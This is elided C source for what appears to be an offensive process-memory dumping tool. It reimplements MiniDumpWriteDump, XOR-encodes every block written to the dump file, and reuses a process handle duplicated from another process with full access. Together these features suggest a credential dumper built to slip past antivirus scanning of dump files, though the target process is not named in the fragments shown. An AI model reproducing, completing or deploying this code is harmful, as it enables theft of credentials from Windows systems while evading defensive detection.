    ...
    if (nts == 0)
    {
        ...
        for (;;)
        {
            if (HandleToUlong(spi->UniqueProcessId) == dc->pid)
            {
                ...
                dc->threads = (dump_thread*)HeapAlloc(GetProcessHeap(), 0,
...
static void writeat(struct dump_context* dc, RVA rva, const void* data, unsigned size)
{
    ...
    BYTE* bufferCopy = (BYTE*)malloc(size);
    memcpy(bufferCopy, data, size);
    xor_aa((BYTE*)bufferCopy, size);

    WriteFile(dc->hFile, bufferCopy, size, &written, NULL);
}
...
static unsigned dump_system_info(struct dump_context* dc)
{
    ...
    // printf("OS Version: %d.%d.%d", dwMajor, dwMinor, dwBuildNumber);
    FreeLibrary(hinst);
...
void minidump_add_memory_block(struct dump_context* dc, ULONG64 base, ULONG size, ULONG rva)
{
    ...
    {
        dc->alloc_mem *= 2;
        dc->mem = (dump_memory*)HeapReAlloc(GetProcessHeap(), 0, dc->mem,
...
static void minidump_add_memory64_block(struct dump_context* dc, ULONG64 base, ULONG64 size)
{
    ...
    {
        dc->alloc_mem64 *= 2;
        dc->mem64 = (dump_memory64*)HeapReAlloc(GetProcessHeap(), 0, dc->mem64,
    ...
    for (i = 0; i < dc->num_mem64; i++)
    {
        ...
        for (pos = 0; pos < dc->mem64[i].size; pos += sizeof(tmp))
        {
            ...
            if (read_process_memory(dc->handle, dc->mem64[i].base + pos, tmp, len))
            {
                ...
                BYTE* bufferCopy = (BYTE*)malloc(len);
                memcpy(bufferCopy, tmp, len);
                xor_aa((BYTE*)bufferCopy, len);

                WriteFile(dc->hFile, bufferCopy, len, &written, NULL);
            }
        }
    ...
    BOOL is_elf)
{
    ...
    {
        dc->alloc_modules = 32;
        dc->modules = (dump_module*)HeapAlloc(GetProcessHeap(), 0,
            dc->alloc_modules * sizeof(*dc->modules));
    }
    else if (dc->num_modules >= dc->alloc_modules)
    {
        dc->alloc_modules *= 2;
        dc->modules = (dump_module*)HeapReAlloc(GetProcessHeap(), 0, dc->modules,
            dc->alloc_modules * sizeof(*dc->modules));
    }
    if (!dc->modules)
    {
    ...
    PVOID user)
{
    ...
    if (pe_load_nt_header(dc->handle, base, &nth))
        add_module((dump_context*)user, name, base, size,
...
BOOL MyMiniDumpWriteDump(HANDLE hProcess, DWORD pid, HANDLE hFile)
{
    ...
    if (!(sym_initialized = SymInitializeW(hProcess, NULL, TRUE)))
    {
        ...
        printf("[-] Failed to initialize symbol engine. Error: 0x%X\n", err);
        return FALSE;
    }
    ...
    if (!fetch_process_info(&dc))
		printf("[-] Failed to fetch process information. Error: 0x%X\n", GetLastError());
        return FALSE;
...
int main(int argc, char* argv[])
{
    ...
    if (hProcess != NULL)
    {
        ...
        if (!MyMiniDumpWriteDump(hProcess, pid, hFile))
        {
			printf("[-] Failed to write dump file. Error: %d\n", GetLastError());
			return 1;
        }
        ...
        if (DuplicateHandle(hCurrentProcess, procDump->ProcessHandle, hCurrentProcess, &hProcess, PROCESS_ALL_ACCESS, FALSE, DUPLICATE_CLOSE_SOURCE)) {
			...
			if (!MyMiniDumpWriteDump(hProcess, pid, hFile))
			{
				printf("[-] Failed to write dump file. Error: 0x%X\n", GetLastError());
				return 1;
			}
        }
        else {
